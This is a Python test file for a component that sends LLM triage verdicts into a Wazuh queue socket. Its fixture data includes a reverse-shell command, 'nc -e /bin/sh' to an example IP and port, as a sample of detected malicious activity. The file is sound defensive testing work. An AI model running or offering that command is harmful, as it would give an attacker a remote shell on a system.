"""Tests for verdict re-injection into the Wazuh queue socket.

The injector must speak Wazuh's queue protocol exactly (``1:llm_triage:<json>``),
bound the free-text fields so a verdict cannot exceed the queue-message limit,
and never raise on a socket error (a transient failure must not crash the loop).
"""

from __future__ import annotations

import json
from unittest.mock import MagicMock, patch

from src.verdict_contract import VERDICT_LOCATION
from src.wazuh_injector import _MAX_JUSTIFICATION_LEN, WazuhVerdictInjector


def _send(injector: WazuhVerdictInjector, **overrides):
    """Send a verdict through a mocked socket; return (ok, decoded_payload)."""
    kwargs = {
        "verdict": "MALICIOUS",
        "risk_level": "CRITICAL",
        "requires_response": True,
        "agent_id": "002",
        "rule_id": "100100",
        "command": "nc -e /bin/sh 198.51.100.77 4444",
        "justification": "reverse shell",
    }
    kwargs.update(overrides)
    sock = MagicMock()
    with patch("src.wazuh_injector.socket.socket", return_value=sock):
        ok = injector.send_verdict(**kwargs)
    sent_bytes = sock.sendto.call_args.args[0] if sock.sendto.called else b""
    return ok, sent_bytes.decode("utf-8") if sent_bytes else ""


def test_send_verdict_uses_correct_queue_prefix() -> None:
    ok, message = _send(WazuhVerdictInjector("/tmp/queue"))
    assert ok is True
    assert message.startswith(f"1:{VERDICT_LOCATION}:")


def test_send_verdict_payload_is_well_formed() -> None:
    _, message = _send(WazuhVerdictInjector("/tmp/queue"))
    payload = json.loads(message.split(":", 2)[2])[VERDICT_LOCATION]
    assert payload["verdict"] == "MALICIOUS"
    assert payload["risk_level"] == "CRITICAL"
    assert payload["agent_id"] == "002"
    assert payload["requires_response"] is True


def test_send_verdict_truncates_long_justification() -> None:
    _, message = _send(WazuhVerdictInjector("/tmp/queue"), justification="x" * 5000)
    payload = json.loads(message.split(":", 2)[2])[VERDICT_LOCATION]
    assert len(payload["justification"]) <= _MAX_JUSTIFICATION_LEN


def test_send_verdict_returns_false_on_socket_error() -> None:
    sock = MagicMock()
    sock.sendto.side_effect = OSError("connection refused")
    with patch("src.wazuh_injector.socket.socket", return_value=sock):
        ok = WazuhVerdictInjector("/tmp/queue").send_verdict(
            verdict="MALICIOUS",
            risk_level="HIGH",
            requires_response=False,
            agent_id="001",
            rule_id="100100",
        )
    assert ok is False
    sock.close.assert_called_once()  # socket always closed, even on failure
